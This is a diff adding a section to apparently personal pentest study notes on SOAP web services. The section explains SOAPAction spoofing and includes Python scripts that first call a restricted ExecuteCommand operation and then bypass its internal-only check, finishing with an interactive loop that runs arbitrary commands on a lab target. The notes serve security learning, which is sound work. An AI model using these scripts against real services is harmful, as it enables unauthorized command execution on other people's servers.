@@ -320,6 +320,87 @@ the found WSDL file uses version 1.1 layout and has many elements:
 - binding - binds the operation to a particular port type. Think of bindings as interfaces. Client calls the relevant port type and uses the details given by the binding to be able to access the operations bound to this port type. Provides web services access details like the message format, operations, messages, and interfaces 
 - service - client makes a call to the web service through the name of the specified service in the service tag. Client identifies the location of the web service 
 
+## SOAPAction Spoofing
+
+SOAP messages towards a SOAP service should include both the operation and the related parameters   
+the operation resides in the first child element of the SOAP message's body   
+if HTTP is the transport then it can use another HTTP header called `SOAPAction`, which contains the operation's name   
+the app can identify the operation within the SOAP body through this header without parsing the XML  
+
+if the service only considers the SOAPAction attribute when determining the operation to execute then it may be vulnerable to spoofing 
+
+we can again find the WSDL file on our target: 
+
+![](Images/Pasted%20image%2020240307154209.png)
+
+we want to look at: 
+
+```xml
+<wsdl:operation name="ExecuteCommand">
+<soap:operation soapAction="ExecuteCommand" style="document"/>
+```
+
+this is a SOAPAction operation called `ExecuteCommand`, we can also look at its parameters: 
+
+```xml
+<s:element name="ExecuteCommandRequest">
+<s:complexType>
+<s:sequence>
+<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
+</s:sequence>
+</s:complexType>
+</s:element>
+```
+
+we can see that there is a `cmd` parameter   
+
+lets make a python script to issue requests, this one will execute the `whoami` command: 
+
+```python
+import requests
+
+payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'
+
+print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+```
+
+when we try to run this script we will get an error that the function is only allowed for internal networks: 
+
+![](Images/Pasted%20image%2020240307154909.png)
+
+we can try to get around this by performing a SOAPAction spoofing attack with a new script: 
+
+```python
+import requests
+
+payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'
+
+print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+```
+
+in this script we instead specify the `LoginRequest` in the `<soap:Body>` so that our request goes through  
+we then specify the parameters of `ExecuteCommand` because we want to have the SOAP service execute a `whoami` command   
+in the `SOAPAction` header we can then use the `ExecuteCommand` operation   
+
+if the web service determines the operation solely based on the `SOAPAction` header we might bypass the restrictions that the SOAP service has and execute our restricted operation   
+
+we can run our new script and see that we get our command output: 
+
+![](Images/Pasted%20image%2020240307155459.png)
+
+you can also modify the script to send multiple commands: 
+
+```python
+import requests
+
+while True:
+    cmd = input("$ ")
+    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
+    print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+```
+
+
+
 ## Command Injection 
 
 command injections against web services would allow system command execution directly on the back-end server   
